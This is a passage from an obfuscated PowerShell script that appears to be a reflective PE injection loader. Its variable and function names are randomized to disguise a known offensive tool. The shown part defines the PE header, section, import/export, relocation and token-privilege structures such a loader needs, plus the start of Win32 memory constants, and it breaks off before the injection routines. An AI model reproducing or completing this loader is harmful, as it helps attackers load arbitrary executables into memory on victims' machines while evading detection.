param($arguments="")

 
function disheveling
{


[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $mhtSMDwv99,

    [Parameter(Position = 1)]
    [String[]]
    $aWAGSJJc99,

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $YNZILtmz99 = 'Void',

    [Parameter(Position = 3)]
    [String]
    $CQEIQBeg99,

    [Parameter(Position = 4)]
    [Int32]
    $rtbgUvGc99,

    [Parameter(Position = 5)]
    [String]
    $YvoMLSII99,

    [Switch]
    $CSQXLYeO99,

    [Switch]
    $JHsLgehC99
)

Set-StrictMode -Version 2


$ETTqvhFE99 = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $mhtSMDwv99,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $YNZILtmz99,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $rtbgUvGc99,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $YvoMLSII99,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $CSQXLYeO99
    )

    Function sooner
    {
        $TIzknaum99 = New-Object System.Object

        $WLbuQnBc99 = [AppDomain]::CurrentDomain
        $ETMpldPs99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $cIHIJuHE99 = $WLbuQnBc99.DefineDynamicAssembly($ETMpldPs99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $guvvnpcR99 = $cIHIJuHE99.DefineDynamicModule('DynamicModule', $false)
        $eZVLsMfR99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]



        $raBhZPeU99 = $guvvnpcR99.DefineEnum('MachineType', 'Public', [UInt16])
        $raBhZPeU99.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $raBhZPeU99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $raBhZPeU99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $raBhZPeU99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $WRMHRasB99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $WRMHRasB99

        $raBhZPeU99 = $guvvnpcR99.DefineEnum('MagicType', 'Public', [UInt16])
        $raBhZPeU99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $KPqgxuCl99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $KPqgxuCl99

        
        $raBhZPeU99 = $guvvnpcR99.DefineEnum('SubSystemType', 'Public', [UInt16])
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $CbnWaVFq99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $CbnWaVFq99

        
        $raBhZPeU99 = $guvvnpcR99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $raBhZPeU99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $raBhZPeU99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $raBhZPeU99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $raBhZPeU99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $raBhZPeU99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $raBhZPeU99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $IeasAVzJ99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $IeasAVzJ99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_DATA_DIRECTORY', $ZxMPoMBV99, [System.ValueType], 8)
        ($raBhZPeU99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($raBhZPeU99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $bNRJwQjA99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $bNRJwQjA99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_FILE_HEADER', $ZxMPoMBV99, [System.ValueType], 20)
        $raBhZPeU99.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $PVyITLsJ99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $PVyITLsJ99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_OPTIONAL_HEADER64', $ZxMPoMBV99, [System.ValueType], 240)
        ($raBhZPeU99.DefineField('Magic', $KPqgxuCl99, 'Public')).SetOffset(0) | Out-Null
        ($raBhZPeU99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($raBhZPeU99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($raBhZPeU99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($raBhZPeU99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($raBhZPeU99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($raBhZPeU99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($raBhZPeU99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($raBhZPeU99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($raBhZPeU99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($raBhZPeU99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($raBhZPeU99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($raBhZPeU99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($raBhZPeU99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($raBhZPeU99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($raBhZPeU99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($raBhZPeU99.DefineField('Subsystem', $CbnWaVFq99, 'Public')).SetOffset(68) | Out-Null
        ($raBhZPeU99.DefineField('DllCharacteristics', $IeasAVzJ99, 'Public')).SetOffset(70) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($raBhZPeU99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($raBhZPeU99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($raBhZPeU99.DefineField('ExportTable', $bNRJwQjA99, 'Public')).SetOffset(112) | Out-Null
        ($raBhZPeU99.DefineField('ImportTable', $bNRJwQjA99, 'Public')).SetOffset(120) | Out-Null
        ($raBhZPeU99.DefineField('ResourceTable', $bNRJwQjA99, 'Public')).SetOffset(128) | Out-Null
        ($raBhZPeU99.DefineField('ExceptionTable', $bNRJwQjA99, 'Public')).SetOffset(136) | Out-Null
        ($raBhZPeU99.DefineField('CertificateTable', $bNRJwQjA99, 'Public')).SetOffset(144) | Out-Null
        ($raBhZPeU99.DefineField('BaseRelocationTable', $bNRJwQjA99, 'Public')).SetOffset(152) | Out-Null
        ($raBhZPeU99.DefineField('Debug', $bNRJwQjA99, 'Public')).SetOffset(160) | Out-Null
        ($raBhZPeU99.DefineField('Architecture', $bNRJwQjA99, 'Public')).SetOffset(168) | Out-Null
        ($raBhZPeU99.DefineField('GlobalPtr', $bNRJwQjA99, 'Public')).SetOffset(176) | Out-Null
        ($raBhZPeU99.DefineField('TLSTable', $bNRJwQjA99, 'Public')).SetOffset(184) | Out-Null
        ($raBhZPeU99.DefineField('LoadConfigTable', $bNRJwQjA99, 'Public')).SetOffset(192) | Out-Null
        ($raBhZPeU99.DefineField('BoundImport', $bNRJwQjA99, 'Public')).SetOffset(200) | Out-Null
        ($raBhZPeU99.DefineField('IAT', $bNRJwQjA99, 'Public')).SetOffset(208) | Out-Null
        ($raBhZPeU99.DefineField('DelayImportDescriptor', $bNRJwQjA99, 'Public')).SetOffset(216) | Out-Null
        ($raBhZPeU99.DefineField('CLRRuntimeHeader', $bNRJwQjA99, 'Public')).SetOffset(224) | Out-Null
        ($raBhZPeU99.DefineField('Reserved', $bNRJwQjA99, 'Public')).SetOffset(232) | Out-Null
        $XEVsSlJf99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $XEVsSlJf99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_OPTIONAL_HEADER32', $ZxMPoMBV99, [System.ValueType], 224)
        ($raBhZPeU99.DefineField('Magic', $KPqgxuCl99, 'Public')).SetOffset(0) | Out-Null
        ($raBhZPeU99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($raBhZPeU99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($raBhZPeU99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($raBhZPeU99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($raBhZPeU99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($raBhZPeU99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($raBhZPeU99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($raBhZPeU99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($raBhZPeU99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($raBhZPeU99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($raBhZPeU99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($raBhZPeU99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($raBhZPeU99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($raBhZPeU99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($raBhZPeU99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($raBhZPeU99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($raBhZPeU99.DefineField('Subsystem', $CbnWaVFq99, 'Public')).SetOffset(68) | Out-Null
        ($raBhZPeU99.DefineField('DllCharacteristics', $IeasAVzJ99, 'Public')).SetOffset(70) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($raBhZPeU99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($raBhZPeU99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($raBhZPeU99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($raBhZPeU99.DefineField('ExportTable', $bNRJwQjA99, 'Public')).SetOffset(96) | Out-Null
        ($raBhZPeU99.DefineField('ImportTable', $bNRJwQjA99, 'Public')).SetOffset(104) | Out-Null
        ($raBhZPeU99.DefineField('ResourceTable', $bNRJwQjA99, 'Public')).SetOffset(112) | Out-Null
        ($raBhZPeU99.DefineField('ExceptionTable', $bNRJwQjA99, 'Public')).SetOffset(120) | Out-Null
        ($raBhZPeU99.DefineField('CertificateTable', $bNRJwQjA99, 'Public')).SetOffset(128) | Out-Null
        ($raBhZPeU99.DefineField('BaseRelocationTable', $bNRJwQjA99, 'Public')).SetOffset(136) | Out-Null
        ($raBhZPeU99.DefineField('Debug', $bNRJwQjA99, 'Public')).SetOffset(144) | Out-Null
        ($raBhZPeU99.DefineField('Architecture', $bNRJwQjA99, 'Public')).SetOffset(152) | Out-Null
        ($raBhZPeU99.DefineField('GlobalPtr', $bNRJwQjA99, 'Public')).SetOffset(160) | Out-Null
        ($raBhZPeU99.DefineField('TLSTable', $bNRJwQjA99, 'Public')).SetOffset(168) | Out-Null
        ($raBhZPeU99.DefineField('LoadConfigTable', $bNRJwQjA99, 'Public')).SetOffset(176) | Out-Null
        ($raBhZPeU99.DefineField('BoundImport', $bNRJwQjA99, 'Public')).SetOffset(184) | Out-Null
        ($raBhZPeU99.DefineField('IAT', $bNRJwQjA99, 'Public')).SetOffset(192) | Out-Null
        ($raBhZPeU99.DefineField('DelayImportDescriptor', $bNRJwQjA99, 'Public')).SetOffset(200) | Out-Null
        ($raBhZPeU99.DefineField('CLRRuntimeHeader', $bNRJwQjA99, 'Public')).SetOffset(208) | Out-Null
        ($raBhZPeU99.DefineField('Reserved', $bNRJwQjA99, 'Public')).SetOffset(216) | Out-Null
        $bLvNFJyk99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $bLvNFJyk99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_NT_HEADERS64', $ZxMPoMBV99, [System.ValueType], 264)
        $raBhZPeU99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('FileHeader', $PVyITLsJ99, 'Public') | Out-Null
        $raBhZPeU99.DefineField('OptionalHeader', $XEVsSlJf99, 'Public') | Out-Null
        $vcgwCyxl99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $vcgwCyxl99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_NT_HEADERS32', $ZxMPoMBV99, [System.ValueType], 248)
        $raBhZPeU99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('FileHeader', $PVyITLsJ99, 'Public') | Out-Null
        $raBhZPeU99.DefineField('OptionalHeader', $bLvNFJyk99, 'Public') | Out-Null
        $noAWgLTj99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $noAWgLTj99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_DOS_HEADER', $ZxMPoMBV99, [System.ValueType], 64)
        $raBhZPeU99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $sXOWsqdW99 = $raBhZPeU99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $nufKtuRD99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $XLRJCYnQ99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $HiOBOFRI99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($eZVLsMfR99, $nufKtuRD99, $XLRJCYnQ99, @([Int32] 4))
        $sXOWsqdW99.SetCustomAttribute($HiOBOFRI99)

        $raBhZPeU99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $IFjDJmXM99 = $raBhZPeU99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $nufKtuRD99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $HiOBOFRI99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($eZVLsMfR99, $nufKtuRD99, $XLRJCYnQ99, @([Int32] 10))
        $IFjDJmXM99.SetCustomAttribute($HiOBOFRI99)

        $raBhZPeU99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $EyCuIAng99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $EyCuIAng99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_SECTION_HEADER', $ZxMPoMBV99, [System.ValueType], 40)

        $GOxEWWhg99 = $raBhZPeU99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $nufKtuRD99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $HiOBOFRI99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($eZVLsMfR99, $nufKtuRD99, $XLRJCYnQ99, @([Int32] 8))
        $GOxEWWhg99.SetCustomAttribute($HiOBOFRI99)

        $raBhZPeU99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $CsrqpwKr99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $CsrqpwKr99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_BASE_RELOCATION', $ZxMPoMBV99, [System.ValueType], 8)
        $raBhZPeU99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $GnTzKMfv99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $GnTzKMfv99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $ZxMPoMBV99, [System.ValueType], 20)
        $raBhZPeU99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $gdQlJCTH99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $gdQlJCTH99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('IMAGE_EXPORT_DIRECTORY', $ZxMPoMBV99, [System.ValueType], 40)
        $raBhZPeU99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $raBhZPeU99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('Base', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $CekLTEds99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $CekLTEds99

        
        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('LUID', $ZxMPoMBV99, [System.ValueType], 8)
        $raBhZPeU99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('LUID_AND_ATTRIBUTES', $ZxMPoMBV99, [System.ValueType], 12)
        $raBhZPeU99.DefineField('Luid', $LUID, 'Public') | Out-Null
        $raBhZPeU99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $lwyjBHlW99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $lwyjBHlW99

        $ZxMPoMBV99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $raBhZPeU99 = $guvvnpcR99.DefineType('TOKEN_PRIVILEGES', $ZxMPoMBV99, [System.ValueType], 16)
        $raBhZPeU99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $raBhZPeU99.DefineField('Privileges', $lwyjBHlW99, 'Public') | Out-Null
        $gQRGlOzw99 = $raBhZPeU99.CreateType()
        $TIzknaum99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $gQRGlOzw99

        return $TIzknaum99
    }

    Function duteous
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
